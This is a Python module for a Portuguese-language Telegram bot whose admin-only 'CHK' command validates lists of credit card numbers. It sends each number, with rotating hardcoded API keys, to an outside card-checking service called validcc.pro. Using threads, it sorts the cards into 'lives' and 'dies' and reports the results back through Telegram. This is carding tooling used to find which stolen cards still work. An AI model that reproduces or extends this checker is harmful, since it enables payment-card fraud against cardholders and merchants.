from telegram.ext import CallbackContext
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
import requests, os, time
from concurrent.futures import ThreadPoolExecutor
from datetime import timedelta
from bot.cogs.modules.adm_list import *
from bot.cogs.modules.separator import *


def contador(start_time):
    try:
        start_time = float(start_time)
        elapsed_time_secs = time.time() - start_time

        msg = str(timedelta(seconds=round(elapsed_time_secs))).split(':')

        minuto = str(int(msg[1])+1)
        segundo = str(60-int(msg[2]))
        if int(segundo) == 60:
            segundo = '59'
        hora = int(msg[0])*60
        
        a = hora+20 - int(minuto)
        
        print(minuto)
        if int(minuto) >= 20:
            result = False
        else:
            result = True    
        
        return str(a), segundo, result

    except Exception as e:
        return '0', '0', False


def time_diference(start_time):
    try:
        start_time = float(start_time)
        elapsed_time_secs = time.time() - start_time

        msg = str(timedelta(seconds=round(elapsed_time_secs))).split(':')

        minuto = msg[1]
        segundo = msg[2]
        
        return f'{minuto}:{segundo}'

    except Exception as e:
        print(e)
        return False, '00:00'


def checker(cc):
    contador = 0
    keys = [
        "SAlPRDy74fs7zYuD9In0-cHJpdmtleQ",
        "3hcZQrgO-HJ5rxtgzdMu-cHJpdmtleQ",
        "k1Cp1iJ0bUo2uDKRpKOx-cHJpdmtleQ",
        "qaVNiOBL4Q6se0Ylg8XW-cHJpdmtleQ",
        "kLgyw-=2g=Vs-WXtJYod-cHJpdmtleQ",
        "aSVEzeLLFh9EuNpkRA1E-cHJpdmtleQ",
        "aSju5xPFMtLMfy6uGuFm-cHJpdmtleQ"
    ]

    while True:
        time.sleep(10)
        if contador <= 10:
            try:
                key = random.choice(keys)
                r = requests.get(f'https://api2.validcc.pro/?key={key}&cc={cc}')
                r = r.json()
                print(r)
                if 'live' in str(r).replace("'", "").lower():
                    return True, f'✅ *-* Aprovado no CHK'
                elif 'limited' in str(r).replace("'", "").lower():
                    pass

                else:
                    return False, f'❌ *-* Reprovado no CHK'

            except:
                pass

            contador += 1

        else:
            return 'Erro', f'⚠️ *-* {cc} - `Erro na comunicação com o checker`'
    

def checker_multiple(lista, idu):
    start_time = time.time()
    workers = 20
    if len(lista) < 20:
        workers = 20
    elif len(lista) < 30:
        workers = 30
    elif len(lista) < 40:
        workers = 40
    elif len(lista) < 50:
        workers = 50
    
    with ThreadPoolExecutor(max_workers=workers) as pool:
        results = list(pool.map(checker,lista))
    
    lista_lives = []
    lista_dies = []
    lista_erros = []
    
    for result in results:
        if result[0] == True:
            lista_lives.append(str(result[1]+' *-* #CHKCONTINENCIA').strip())
        elif result[0] == False:
            lista_dies.append(str(result[1]).strip())
        else:
            lista_erros.append(str(result[1]).strip())

    lista_a = '\n'.join(lista_lives)
    lista_b = '\n'.join(lista_dies)
    lista_c = '\n'.join(lista_erros)
    
    if len(lista_lives) == 0:
        lista_a = 'Nada consta'
        
    if len(lista_dies) == 0:
        lista_b = 'Nada consta'
        
    if len(lista_erros) == 0:
        lista_c = 'Nada consta'
    
    tempo_execucao = time_diference(start_time)

    write = F'💳 | *CHK*:\n\n*CCs lives*: `{len(lista_lives)}`\n*CCs dies*: `{len(lista_dies)}`\n*CCs com erro ao checar*: `{len(lista_erros)}`\n*Tempo de checagem*: `{tempo_execucao}`\n*Gateway usada*: `Zerodolar (pré-auth)`\n*CCs checadas*: `{len(lista)}`'
    listagem = f'\n\n*CCS LIVES*:\n\n{lista_a}\n\n*CCS RECUSADAS*: \n\n{lista_b}\n\n*CCS RECUSADAS POR ERROS*: \n\n{lista_c}'

    if len(lista) > 10:
        with open(f'temp/resultado-{idu}.txt', 'w', encoding="UTF-8") as file:
            file.write(str(write+listagem).replace('*', '').replace('`', ''))
        
        return True, write

    else:
        return False, str(write+listagem)


def chk(update: Update, context: CallbackContext):
    query = update.message
    user_info = query.from_user
    user_id = str(user_info['id'])
    donos = adm_list()

    if user_id in donos:
        temp_file = ''
        
        try:
            content = update.message.text
            
            if content is None:
                try:
                    temp_file = f"temp/temp_file_db_check_{user_id}.txt"
                    with open(temp_file, 'wb') as f:
                        context.bot.get_file(update.message.document).download(out=f)
                        
                    with open(temp_file, 'r') as f:
                        content = f.read()

                except:
                    content = ''

            ccs_r = separator(content)
            ccs = []
            for cc in ccs_r:
                if cc not in ccs:
                    ccs.append(cc)
            
            workers = 20
            if len(ccs) < 20:
                workers = 20
            elif len(ccs) < 30:
                workers = 30
            elif len(ccs) < 40:
                workers = 40
            elif len(ccs) < 50:
                workers = 50
            
            if len(ccs) > 0:
                if len(ccs) == 1:
                    message = update.message.reply_text(text='*Checando a CC...*\nIsso pode levar alguns segundo!', parse_mode='Markdown')
                    texto = checker(ccs[0])
                    message.delete()
                    update.message.reply_text(text=str(texto[1])+' - #CHKCONTINENCIA', parse_mode='Markdown')
                
                else:
                    minutos_min = len(ccs)//workers
                    if minutos_min == 0:
                        minutos_min = 1
                    minutos_max = minutos_min*2
                    
                    message = update.message.reply_text(text=f'💳 | *CHK*\n\nEstamos checando a sua lista de CCs, isso pode levar de {minutos_min} minuto(s) a {minutos_max} minutos', parse_mode='Markdown')
                    
                    texto = checker_multiple(ccs, user_id)
                    message.delete()
                    
                    if texto[0] == False:
                        update.message.reply_text(text=str(texto[1])+'\n\n#CHKCONTINENCIA', parse_mode='Markdown')

                    else:
                        query.bot.send_document(chat_id=user_id, document=open(f'temp/resultado-{user_id}.txt', 'rb'), caption=str(texto[1])+'\n\nUm arquivo de texto com os resultados foram anexados a essa mensagem!\n\n#CHKCONTINENCIA', parse_mode='Markdown')
                        
                        try:
                            os.remove(f'temp/resultado-{user_id}.txt')
                            os.remove(temp_file)
                        except:
                            pass

            else:
                texto = '💳 | *CHK*\n\nInsira no mínimo uma CC pra começar a checagem!'
                update.message.reply_text(text=texto, parse_mode='Markdown')

        except Exception as e:
            print('\nErro no checker:', e, '\nTipo de erro:', type(e).__name__, ', arquivo:', __file__, ', na linha:', e.__traceback__.tb_lineno)
            update.message.reply_text(text='❌ | *Erro*\n\nOcorreu um erro ao executar esse comando!', parse_mode='Markdown')

    else:
        update.message.reply_text(text='❌ | *Erro*\n\nVocê não tem permissão para executar esse comando! False com um administrador!', parse_mode='Markdown')



